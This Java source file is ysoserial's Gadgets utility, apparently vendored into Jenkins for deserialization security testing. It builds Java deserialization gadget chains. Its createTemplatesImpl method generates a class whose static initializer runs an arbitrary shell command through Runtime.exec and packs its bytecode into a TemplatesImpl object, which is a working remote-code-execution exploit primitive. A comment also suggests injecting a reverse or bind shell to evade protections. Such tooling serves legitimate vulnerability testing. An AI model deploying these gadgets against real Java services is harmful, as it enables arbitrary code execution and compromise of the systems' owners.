/*
 * The MIT License
 *
 * Copyright (c) 2013 Chris Frohoff
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package jenkins.security.ysoserial.util;

import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings("restriction")
public class Gadgets {
	private static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";	
	
	public static class StubTransletPayload extends AbstractTranslet implements Serializable {
		private static final long serialVersionUID = -5971610431559700674L;

		public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

		@Override
		public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}	
	}

	// required to make TemplatesImpl happy
	public static class Foo implements Serializable {
		private static final long serialVersionUID = 8207363842866235160L; 		
	}

	public static <T> T createMemoitizedProxy(final Map<String,Object> map, final Class<T> iface, 
		final Class<?> ... ifaces) throws Exception {	    
	    return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);	    
	}

	public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
		return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
	}
	
	public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?> ... ifaces) {
		final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
		allIfaces[0] = iface;
		if (ifaces.length > 0) {
			System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);	
		}		
		return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces , ih));
	}

	public static Map<String,Object> createMap(final String key, final Object val) {
		final Map<String,Object> map = new HashMap<String, Object>();
		map.put(key,val);
		return map;
	}

	public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
		final TemplatesImpl templates = new TemplatesImpl();		
		
		// use template gadget class
		ClassPool pool = ClassPool.getDefault();
		pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
		final CtClass clazz = pool.get(StubTransletPayload.class.getName());
		// run command in static initializer
		// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
		clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");
		// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
		clazz.setName("ysoserial.Pwner" + System.nanoTime());		
		
		final byte[] classBytes = clazz.toBytecode();
		
		// inject class bytes into instance
		Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
			classBytes,
			ClassFiles.classAsBytes(Foo.class)});
		
		// required to make TemplatesImpl happy
		Reflections.setFieldValue(templates, "_name", "Pwnr"); 			
		Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
		return templates;
	}
}
